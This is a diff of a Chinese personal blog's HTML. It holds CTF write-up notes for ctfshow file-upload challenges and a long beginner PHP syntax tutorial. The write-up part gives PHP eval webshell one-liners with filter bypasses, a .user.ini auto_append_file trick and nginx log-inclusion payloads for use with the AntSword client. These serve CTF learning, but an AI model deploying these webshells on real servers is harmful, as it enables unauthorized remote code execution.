+<li>连蚁剑，找flag即可<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717112120.png"></li>
+<li>连蚁剑的时候，路径写到和.user.ini和1.txt同级的位置，即到.user.ini的上一级目录，/upload的位置</li>
+</ol>
+<h4 id="不允许使用中括号-，ctfshow156"><a href="#不允许使用中括号-，ctfshow156" class="headerlink" title="不允许使用中括号[]，ctfshow156"></a>不允许使用中括号[]，ctfshow156</h4><ol>
+<li>直接使用大括号{}替换中括号[]<pre class="line-numbers language-none"><code class="language-none">&lt;?&#x3D; eval($_POST&#123;&#39;shell&#39;&#125;) ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+</ol>
+<h4 id="中括号和大括号都过滤了，还过滤了分号，ctfshow157"><a href="#中括号和大括号都过滤了，还过滤了分号，ctfshow157" class="headerlink" title="中括号和大括号都过滤了，还过滤了分号，ctfshow157"></a>中括号和大括号都过滤了，还过滤了分号，ctfshow157</h4><ol>
+<li>这个时候我们可以使用array_pop()函数,函数内部写接收的参数，使用逃逸传参，参数以post或者get方式传入，但是还是不行<pre class="line-numbers language-none"><code class="language-none">&lt;?&#x3D;eval(array_pop($_POST[&#39;1&#39;]);&amp;1&#x3D;system(&quot;待执行命令&quot;));?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<li>进一步发现过滤了分号，最后位置的语句可以不带分号结尾,即可以上传成功<pre class="line-numbers language-none"><code class="language-none">&lt;?&#x3D;eval(array_pop($_POST[1])?&gt;&amp;1&#x3D;system(&quot;待执行语句&quot;))?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<li>用蚁剑连接到*.user.ini的上一级目录位置*，开终端搞就行</li>
+</ol>
+<h3 id="web159，对大小括号进行过滤-对特殊路径字符进行过滤"><a href="#web159，对大小括号进行过滤-对特殊路径字符进行过滤" class="headerlink" title="web159，对大小括号进行过滤,对特殊路径字符进行过滤"></a>web159，对大小括号进行过滤,对特殊路径字符进行过滤</h3><ol>
+<li>使用文件包含进行绕过</li>
+<li>对’log’字样进行过滤，使用.进行拼接<pre class="line-numbers language-none"><code class="language-none">&lt;?&#x3D;include&#39;var&#x2F;l&#39;.&#39;og&#x2F;nginx&#x2F;access.l&#39;.&#39;og&#39;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+</ol>
+<h3 id="重复改包的技巧"><a href="#重复改包的技巧" class="headerlink" title="重复改包的技巧"></a>重复改包的技巧</h3><ol>
+<li><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220717150132.png"></li>
+<li>host的位置是域名去掉前面的http头和最后那里的‘/’而成的</li>
+</ol>
+<h3 id="web160"><a href="#web160" class="headerlink" title="web160"></a>web160</h3><h4 id="使用文件包含"><a href="#使用文件包含" class="headerlink" title="使用文件包含"></a>使用文件包含</h4><ol>
+<li>/var/log/nginx/access.log</li>
+<li>因为对log有过滤，所以可以使用php的’.’去进行拼接</li>
+<li>‘/var/l’.’og/nginx/access.l’.’og’</li>
+</ol>
+<h4 id="题"><a href="#题" class="headerlink" title="题"></a>题</h4><ol>
+<li>题中过滤了空格，小括号</li>
+<li>可以使用文件包含去做</li>
+<li>先上传一个.user.ini,内容为auto_append_file=1.txt</li>
+<li>1.txt中写一句话木马</li>
+<li><?=include1'/var/l'.'og/nginx/access.l'.'og'?>，这个地方因为过滤了空格，我们考虑使用空白换行符，但是不能直接换行，否则解码的时候空格和换行符的URL编码相同<br><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220728161132.png"></li>
+<li>把上面的1位置的hex值由31改为0d即可上传</li>
+<li>后面接着改UA，连接蚁剑即可</li>
+</ol>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/php%E8%AF%AD%E6%B3%95/">
+                php基本语法复习
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2022-07-11</span>
+            
+            
+                <a href="http://dezhoutorizhao.github.io/php%E8%AF%AD%E6%B3%95/#disqus_thread" class="comments article-comment-link">留言</a>
+            
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <h1 id="php"><a href="#php" class="headerlink" title="php"></a>php</h1><h2 id="一种创建动态交互性站点的强有力的服务端脚本语言"><a href="#一种创建动态交互性站点的强有力的服务端脚本语言" class="headerlink" title="一种创建动态交互性站点的强有力的服务端脚本语言"></a>一种创建动态交互性站点的强有力的服务端脚本语言</h2><h2 id="环境：phpstudy搭建而成"><a href="#环境：phpstudy搭建而成" class="headerlink" title="环境：phpstudy搭建而成"></a>环境：phpstudy搭建而成</h2><ol>
+<li>在phpstudy下的WWW下的文件夹下编写php程序</li>
+<li>保存到WWW的下一级目录下</li>
+<li>可以使用回环地址加上php文件名运行程序</li>
+<li>例如:127.0.0.1/文件名.php</li>
+</ol>
+<h2 id="什么是php文件"><a href="#什么是php文件" class="headerlink" title="什么是php文件"></a>什么是php文件</h2><ol>
+<li>php文件可以包含文本、HTML、CSS、以及PHP代码</li>
+<li>php代码在服务器上执行，而结果以纯文本的形式返回浏览器</li>
+<li>文件名后缀为.php</li>
+</ol>
+<h2 id="php能够做什么"><a href="#php能够做什么" class="headerlink" title="php能够做什么"></a>php能够做什么</h2><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220708183356.png"></p>
+<h2 id="语法知识"><a href="#语法知识" class="headerlink" title="语法知识"></a>语法知识</h2><h3 id="php脚本可以放在文档中的任何位置"><a href="#php脚本可以放在文档中的任何位置" class="headerlink" title="php脚本可以放在文档中的任何位置"></a>php脚本可以放在文档中的任何位置</h3><h3 id="开头结尾"><a href="#开头结尾" class="headerlink" title="开头结尾"></a>开头结尾</h3><ol>
+<li>php脚本以’ &lt;?php ‘开头</li>
+<li>以’ ?&gt; ‘结尾</li>
+</ol>
+<h3 id="内建php输出文本函数"><a href="#内建php输出文本函数" class="headerlink" title="内建php输出文本函数"></a>内建php输出文本函数</h3><ol>
+<li>echo<pre class="line-numbers language-none"><code class="language-none">&lt;!DOCTYPE html&gt;
 &lt;html&gt;
 &lt;body&gt;
 
@@ -200,37 +744,960 @@ echo &quot;Hello World!&quot;;
 ?&gt;
 
 &lt;&#x2F;body&gt;
-&lt;&#x2F;html&gt;
+&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+</ol>
+<h3 id="php语句以分号结尾（；）"><a href="#php语句以分号结尾（；）" class="headerlink" title="php语句以分号结尾（；）"></a>php语句以分号结尾（；）</h3><ol>
+<li>php代码块的关闭标签也会自动表明分号，因此在php代码的最后一行不必使用分号</li>
+</ol>
+<h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><ol>
+<li>php的注释和c++的注释符号一样<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;
+#
+&#x2F;*
+    此处为注释
+*&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+</ol>
+<h3 id="php对大小写敏感性问题"><a href="#php对大小写敏感性问题" class="headerlink" title="php对大小写敏感性问题"></a>php对大小写敏感性问题</h3><pre class="line-numbers language-none"><code class="language-none">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;body&gt;
 
-php语句以分号结尾（；）
-php代码块的关闭标签也会自动表明分号 ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/%E5%B0%8F%E8%BF%AA%E8%80%81%E5%B8%88/" title="小迪老师信息收集">小迪老师信息收集</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2022-07-05T16:05:29.484Z" title="发表于 2022-07-06 00:05:29">2022-07-06</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/CTF/">CTF</a></span></div><div class="content">概念名词域名
-网站地址的名称
-注册：在第三方平台注册，万网（被阿里云收购）二级域名，多级域名
-www是顶级域名，域名有几个点就算几个域名，一级域名只有一个点，往往由与品牌高度相关的主域名和后缀组成
-二级域名，是一级域名的子域名，是企业根据不同的业务场景进行的拓展
-一级域名和二级域名区别：二级域名依附于一级域名而存在吗，没有一级域名，就不存在二级域名，如果不作二级域名，一级域名则不会受到影响。
-处罚连带不同，一级域名被处罚，二级域名也会被处罚；二级域名被处罚时，一级域名则不会受到影响。
-以example.cn这个一级域名为例，我们在设置解析记录时，将主机记录值设置为“www”，然后指向IP为192.168.1.1，那么我们访问www.example.cn，就会跳转到192.168.1.1这个站点；如果我们将主机值设置为“mail”，然后将IP指向192.168.2.2，那么我们访问mail.example.cn就会跳转到192.168.2.2这个站点。域名分类
-国家级和地区级顶级域名
-一级域名
-二级域名
+&lt;?php
+ECHO &quot;Hello World!&lt;br&gt;&quot;;
+echo &quot;Hello World!&lt;br&gt;&quot;;
+EcHo &quot;Hello World!&lt;br&gt;&quot;;
+?&gt;
 
-域名发现对渗透测试的意义
-不同的多级域名包含的信息不同，例如www.xxx.com ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B/" title="判断注入类型">判断注入类型</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2022-07-01T20:22:42.674Z" title="发表于 2022-07-02 04:22:42">2022-07-02</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/CTF/">CTF</a></span></div><div class="content">判断注入类型区分是字符型注入还是数字型注入数字型注入：
-假设后台语句构造为select * from table where id=$id
-传入5’ –+
-select * from table where id=5’ –+ 未产生单引号闭合，所以报错
+&lt;&#x2F;body&gt;
+&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<ol>
+<li>以上的三种方法等价</li>
+<li>所有<strong>用户定义的****函数，类和关键词</strong>都对大小写不敏感，例如if else echo等等</li>
+<li>在php中所有变量都对大小写敏感,试运行以下代码<pre class="line-numbers language-none"><code class="language-none">&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;body&gt;
 
-字符型注入：
-假设后台语句构造为select * from table where id=$’id’
-传入5’ –+
-select * from table where id=’5’ –+ ‘
-最后的一个单引号被注释掉，单引号可以闭合，此时查询正确
+&lt;?php
+$color&#x3D;&quot;red&quot;;
+echo &quot;My car is &quot; . $color . &quot;&lt;br&gt;&quot;;
+echo &quot;My house is &quot; . $COLOR . &quot;&lt;br&gt;&quot;;
+echo &quot;My boat is &quot; . $coLOR . &quot;&lt;br&gt;&quot;;
+?&gt;
 
-所以加单引号去判断是数字型注入还是字符型注入实例：?id&#x3D;5 and 1&#x3D;1 如果返回页面与原页面一致（回显正确） 则为数值型注入
+&lt;&#x2F;body&gt;
+&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+</ol>
+<h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><h4 id="变量的命名规则"><a href="#变量的命名规则" class="headerlink" title="变量的命名规则"></a>变量的命名规则</h4><ol>
+<li>变量以$符号开头，其后是变量的名称</li>
+<li>变量名称必须以字母或者下划线开头</li>
+<li>变量名称不能以数字开头</li>
+<li>变量名称只能包含字母数字下划线</li>
+<li>变量名称对大小写敏感</li>
+</ol>
+<h4 id="变量的创建"><a href="#变量的创建" class="headerlink" title="变量的创建"></a>变量的创建</h4><ol>
+<li>php没有创建变量的命令</li>
+<li>变量会在首次赋值时被创建</li>
+<li>如果为变量赋值为文本，用引号包围该值</li>
+</ol>
+<h4 id="变量的引用"><a href="#变量的引用" class="headerlink" title="变量的引用"></a>变量的引用</h4><ol>
+<li>变量的引用也需要加‘$’</li>
+<li>取数组中的某一个元素加大括号{数组[index]}</li>
+</ol>
+<h4 id="PHP-是一门类型松散的语言"><a href="#PHP-是一门类型松散的语言" class="headerlink" title="PHP 是一门类型松散的语言"></a>PHP 是一门类型松散的语言</h4><ol>
+<li>php在创建变量的时候不必告知php变量的数据类型</li>
+</ol>
+<h4 id="php变量作用域"><a href="#php变量作用域" class="headerlink" title="php变量作用域"></a>php变量作用域</h4><ol>
+<li>可以在任意位置对变量进行声明</li>
+<li>三个作用域：<strong>local global static</strong><h5 id="local和global"><a href="#local和global" class="headerlink" title="local和global"></a>local和global</h5></li>
+<li>global是全局作用域，可以在函数外访问</li>
+<li>local是局部作用域，只能在函数内部进行访问</li>
+<li>在函数外部定义的是global</li>
+<li>函数内部定义的是local</li>
+<li>global关键词，用于<strong>在函数内部访问全局变量</strong>，要做到这一点，要在<strong>函数内部变量前面使用global关键词</strong>，（这一点和python不同，python中global是将局部变量转换为全局变量，而php中是在函数内部<strong>调用全局变量</strong>），<strong>如果删除global，将不能在函数内部调用全局变量</strong></li>
+<li>php同时在名为 $GLOBALS[index]的数组中存储了所有的全局变量，下标存有变量名，用 \ $GLOBALS[index]即可访问到名为index的全局变量</li>
+</ol>
+<h5 id="static关键词"><a href="#static关键词" class="headerlink" title="static关键词"></a>static关键词</h5><ol>
+<li>通常，在函数完成或执行后，会删除所有变量，不过有时我需要不删除某个局部变量</li>
+<li>使用static关键词<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+
+function myTest() &#123;
+  static $x&#x3D;0;
+  echo $x;
+  $x++;
+&#125;
+
+myTest();
+myTest();
+myTest();
+
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+<li>每当函数被调用时，这个变量所存储的信息都是函数最后一次被调用时包含的信息（不会重新赋值）</li>
+<li>但是这个变量仍然是局部变量</li>
+</ol>
+<h3 id="echo和print"><a href="#echo和print" class="headerlink" title="echo和print"></a>echo和print</h3><h4 id="差异"><a href="#差异" class="headerlink" title="差异"></a>差异</h4><ol>
+<li>echo能够输出一个以上的字符串</li>
+<li>print只能输出一个字符串，始终返回值为1</li>
+<li>echo比print稍快，因为他不返回任何值</li>
+</ol>
+<h4 id="print"><a href="#print" class="headerlink" title="print"></a>print</h4><ol>
+<li>有无括号都可使用（**print和print()**）<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+$txt1&#x3D;&quot;Learn PHP&quot;;
+$txt2&#x3D;&quot;W3School.com.cn&quot;;
+$cars&#x3D;array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;SAAB&quot;);
+
+print $txt1;
+print &quot;&lt;br&gt;&quot;;
+print &quot;Study PHP at $txt2&quot;;
+print &quot;My car is a &#123;$cars[0]&#125;&quot;;
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+<li>取数组中的某一个元素需要加大括号，大括号内部是数组名[index]</li>
+</ol>
+<h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><ol>
+<li>字符串是字符序列</li>
+<li>单双括号等价</li>
+</ol>
+<h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><h3 id="var-dump-函数"><a href="#var-dump-函数" class="headerlink" title="var_dump()函数"></a>var_dump()函数</h3><ol>
+<li>返回变量的数据类型和值</li>
+<li>值自动转化为十进制的值</li>
+</ol>
+<h3 id="php对象"><a href="#php对象" class="headerlink" title="php对象"></a>php对象</h3><ol>
+<li>对象是存储数据和有关如何处理数据的信息的数据类型</li>
+<li>php中必须明确地声明对象</li>
+<li>首先必须声明对象的类，使用class关键词，类是包含属性和方法的结构</li>
+<li>在对象类中定义数据类型，然后在该类的实例中使用此数据类型</li>
+</ol>
+<h3 id="NULL值"><a href="#NULL值" class="headerlink" title="NULL值"></a>NULL值</h3><ol>
+<li>表示变量无量</li>
+<li>NULL是NULL唯一可能的值</li>
+<li>NULL值表示变量是否为空，用于区分字符串与空值数据库</li>
+</ol>
+<h2 id="字符串函数"><a href="#字符串函数" class="headerlink" title="字符串函数"></a>字符串函数</h2><h3 id="strlen"><a href="#strlen" class="headerlink" title="strlen()"></a>strlen()</h3><ol>
+<li>返回字符串的长度<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+    echo strlen(&quot;hello world&quot;);
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li>
+</ol>
+<h3 id="字符串中单词个数的统计"><a href="#字符串中单词个数的统计" class="headerlink" title="字符串中单词个数的统计"></a>字符串中单词个数的统计</h3><ol>
+<li>str_word_count()<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+    echo str_word_count(&quot;hello world&quot;);
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li>
+</ol>
+<h3 id="strrev"><a href="#strrev" class="headerlink" title="strrev()"></a>strrev()</h3><ol>
+<li>用于反转字符串<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+    echo strrev(&quot;hello world&quot;); &#x2F;&#x2F;输出dlrow olleh
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li>
+</ol>
+<h3 id="strpos"><a href="#strpos" class="headerlink" title="strpos()"></a>strpos()</h3><ol>
+<li>用于检索字符串内指定的字符或文本</li>
+<li>如果找到匹配，则会返回首个匹配的字符位置，如果未找到，则会返回false</li>
+<li>strpos(“原字符串”，“待检索字符串”);<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+    echo strpos(&quot;hello world&quot;,&quot;world&quot;); &#x2F;&#x2F;输出为6，下标从0开始（很特殊的是sql中的substr）;
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li>
+</ol>
+<h3 id="str-replace"><a href="#str-replace" class="headerlink" title="str_replace()"></a>str_replace()</h3><ol>
+<li>用一些字符串替换字符串中的另一些字符<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+    echo str_replace(&quot;被替换字符&quot;,&quot;替换字符&quot;，“原string”);
+    echo str_replace(&quot;world&quot;,&quot;kitty&quot;,&quot;hello world&quot;); &#x2F;&#x2F;结果为hello kitty
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li>
+</ol>
+<h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h2><h3 id="常量是单个值的标识符，脚本中无法改变该值"><a href="#常量是单个值的标识符，脚本中无法改变该值" class="headerlink" title="常量是单个值的标识符，脚本中无法改变该值"></a>常量是单个值的标识符，脚本中无法改变该值</h3><h3 id="有效的常量名以字符或下划线开头，（常量名称前面没有-符号）"><a href="#有效的常量名以字符或下划线开头，（常量名称前面没有-符号）" class="headerlink" title="有效的常量名以字符或下划线开头，（常量名称前面没有$符号）"></a>有效的常量名以字符或下划线开头，（<strong>常量名称前面没有$符号</strong>）</h3><h3 id="设置php变量"><a href="#设置php变量" class="headerlink" title="设置php变量"></a>设置php变量</h3><ol>
+<li>define()函数，一共三个参数</li>
+<li>首个参数定义常量的名称</li>
+<li>第二个参数定义常量的值</li>
+<li>第三个参数规定常量名对大小写是否敏感，默认为false<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+    define(&quot;GREETING&quot;,&quot;Welcome&quot;)；
+    echo GTEETING; &#x2F;&#x2F;创建了一个对大小写不敏感的GREETING常量，值为Welcome;
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li>
+</ol>
+<h3 id="常量是全局的，而且可以贯穿整个脚本使用"><a href="#常量是全局的，而且可以贯穿整个脚本使用" class="headerlink" title="常量是全局的，而且可以贯穿整个脚本使用"></a>常量是全局的，而且可以贯穿整个脚本使用</h3><pre class="line-numbers language-none"><code class="language-none">&lt;?php
+    define(&quot;GREETING&quot;,&quot;Welcome&quot;);
+    function mytest() &#123;
+        echo GREETING;
+    &#125;
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<ol>
+<li>在函数内使用了一个常量，即使它在函数外定义</li>
+</ol>
+<h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><h3 id=""><a href="#" class="headerlink" title="+ - * / %"></a>+ - * / %</h3><ol>
+<li>$x + $y</li>
+<li>$x - $y</li>
+<li>$x * $y</li>
+<li>$x / $y</li>
+<li>$x % $y<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+    $x&#x3D;17;
+    $y&#x3D;8;
+    echo ($x+$y);
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+</ol>
+<h3 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h3><ol>
+<li>用于向变量写值</li>
+<li>基础赋值运算符为=</li>
+<li>右赋给左</li>
+</ol>
+<h3 id="字符串运算符"><a href="#字符串运算符" class="headerlink" title="字符串运算符"></a>字符串运算符</h3><h4 id="-1"><a href="#-1" class="headerlink" title="."></a>.</h4><ol>
+<li>. 表示串接，$txt1=”hello” $txt2=$txt1.”world”;//$txt2为hello world</li>
+<li>.= 串接赋值，$txt1=”hello” $txt1.=”world”;//$txt1为hello world (类似于+=)</li>
+</ol>
+<h3 id="递增递减"><a href="#递增递减" class="headerlink" title="递增递减"></a>递增递减</h3><ol>
+<li>++$x</li>
+<li>–$x</li>
+<li>$x++</li>
+<li>$x–</li>
+</ol>
+<h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><ol>
+<li>and</li>
+<li>or 至少有一个就返回true</li>
+<li>xor 有且仅有一个为true，则返回true</li>
+<li>&amp;&amp;</li>
+<li>||</li>
+<li>！</li>
+</ol>
+<h3 id="数组运算符"><a href="#数组运算符" class="headerlink" title="数组运算符"></a>数组运算符</h3><ol>
+<li><ul>
+<li>联合</li>
+</ul>
+</li>
+<li>== 相等</li>
+<li>=== 全等</li>
+<li>!=</li>
+<li>&lt;&gt;</li>
+<li>!==</li>
+</ol>
+<h2 id="if-else"><a href="#if-else" class="headerlink" title="if else"></a>if else</h2><h3 id="if-elseif-else"><a href="#if-elseif-else" class="headerlink" title="if elseif else"></a>if elseif else</h3><pre class="line-numbers language-none"><code class="language-none">if (条件) &#123;
+    语句;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="if-elseif-else-1"><a href="#if-elseif-else-1" class="headerlink" title="if elseif else"></a>if elseif else</h3><pre class="line-numbers language-none"><code class="language-none">&lt;?php
+if()&#123;
+
+&#125;
+elseif()&#123;
+
+&#125;
+else&#123;
+
+&#125;
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h3><ol>
+<li>有选择地执行若干代码<pre class="line-numbers language-none"><code class="language-none">switch(expression)&#123;
+    case label1:
+        expression &#x3D; label1时执行的代码;
+        break;
+    case label2:
+        expression &#x3D; label2时执行的代码;
+        break;
+    default:
+        表达式的值不等于label1和label2时执行的代码
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+<li>如果没有case为真，才使用default</li>
+</ol>
+<h2 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h2><ol>
+<li>while只要条件为真，循环执行</li>
+<li>do while先执行一次代码块，然后只要指定条件为真，则重复循环（<strong>先做一次do，再判断while</strong>），即至少会执行一次语句，即使条件测试在第一次就失败了</li>
+</ol>
+<h2 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h2><ol>
+<li>提前确定了脚本运行的次数，用for循环<pre class="line-numbers language-none"><code class="language-none">for(init counter;test counter;increment counter)&#123;
+    code to be executed;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li>
+<li>第一个参数是初始化循环计数器的值</li>
+<li>第二个参数是判断每个循环迭代，true继续，false结束</li>
+<li>第三个参数是增加循环计数器的值<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+    for($x&#x3D;0;$x&lt;&#x3D;10;$x++)&#123;
+        echo &quot;xxx&quot;;
+    &#125;
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="执行顺序"><a href="#执行顺序" class="headerlink" title="执行顺序"></a>执行顺序</h3></li>
+<li>定义（1）</li>
+<li>判断（2）</li>
+<li>执行循环体语句</li>
+<li>改变循环变量（3）</li>
+</ol>
+<h3 id="foreach"><a href="#foreach" class="headerlink" title="foreach"></a>foreach</h3><ol>
+<li>foreach循环只用于数组，用于遍历数组中的每个键值对<pre class="line-numbers language-none"><code class="language-none">foreach($array as $value)&#123;
+    执行代码
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li>
+<li>每一次循环迭代，当前数组的值就会赋给$value变量，并且数组指针会逐一移动，直到到达最后一个数组元素<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+    $color &#x3D; array(&quot;red&quot;,&quot;green&quot;,&quot;blue&quot;);
+    foreach($color as $value)&#123; &#x2F;&#x2F;类似于c++中的范围遍历，将$color数组中的每一个元素作为value
+        echo &quot;value&quot;;
+    &#125;
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+</ol>
+<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="php真正的力量，来自于它的函数，php拥有超过1000个内建的函数"><a href="#php真正的力量，来自于它的函数，php拥有超过1000个内建的函数" class="headerlink" title="php真正的力量，来自于它的函数，php拥有超过1000个内建的函数"></a>php真正的力量，来自于它的函数，php拥有超过1000个内建的函数</h3><h3 id="用户定义函数"><a href="#用户定义函数" class="headerlink" title="用户定义函数"></a>用户定义函数</h3><ol>
+<li>以单词function开头<pre class="line-numbers language-none"><code class="language-none">function functionname()&#123;
+    被执行的代码;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li>
+<li>函数名对大小写不敏感</li>
+</ol>
+<h3 id="php函数参数"><a href="#php函数参数" class="headerlink" title="php函数参数"></a>php函数参数</h3><ol>
+<li>通过参数向函数传递信息，参数类似于变量</li>
+<li>逗号隔开参数<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+    function family($name)&#123;
+        echo &quot;$name&quot;;
+    &#125;
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+</ol>
+<h3 id="默认参数值"><a href="#默认参数值" class="headerlink" title="默认参数值"></a>默认参数值</h3><ol>
+<li>如果调用没有参数的函数，参数会取默认值</li>
+<li>默认参数值只会发生在函数的<strong>调用过程</strong>中<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+    function setheight($min&#x3D;60)&#123;
+        echo &quot;height is $min&quot;;
+    &#125;
+    setheight();     &#x2F;&#x2F;无参数，使用默认值60
+    setheight(100);  &#x2F;&#x2F;有参数，不适用默认值，使用传入的100
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+</ol>
+<h3 id="php函数返回值"><a href="#php函数返回值" class="headerlink" title="php函数返回值"></a>php函数返回值</h3><ol>
+<li>使用返回值，用return</li>
+<li>当函数内部使用形参时，想要往外输出参数，则需要return，因为形参不是全局变量、</li>
+</ol>
+<h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><h3 id="数组能够在单独的变量名中存储一个或多个值"><a href="#数组能够在单独的变量名中存储一个或多个值" class="headerlink" title="数组能够在单独的变量名中存储一个或多个值"></a>数组能够在单独的<strong>变量名</strong>中存储一个或多个值</h3><pre class="line-numbers language-none"><code class="language-none">&lt;?php
+    $cars&#x3D;array(&quot;a&quot;,&quot;b&quot;,&quot;c&quot;);
+    echo &quot;I like&quot; . $cars[0] . &quot;,&quot; . $cars[1] . &quot;,&quot; . cars[2] . &quot;.&quot;;
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="定义方法"><a href="#定义方法" class="headerlink" title="定义方法"></a>定义方法</h3><ol>
+<li>array()函数用于创建函数<h4 id="三种数组类型"><a href="#三种数组类型" class="headerlink" title="三种数组类型"></a>三种数组类型</h4></li>
+<li>索引数组 - 带有数字索引的数组</li>
+<li>关联数组 - 带有指定键的数组</li>
+<li>多维数组 - 包含一个或多个数组的数组</li>
+</ol>
+<h4 id="索引数组"><a href="#索引数组" class="headerlink" title="索引数组"></a>索引数组</h4><h5 id="索引是自动分配的"><a href="#索引是自动分配的" class="headerlink" title="索引是自动分配的"></a>索引是自动分配的</h5><ol>
+<li>索引自动分配，从0开始<pre class="line-numbers language-none"><code class="language-none">$cars&#x3D;array(&#39;a&#39;,&#39;b&#39;,&#39;c&#39;);
+等价于
+$cars[0] &#x3D; &#39;a&#39;;
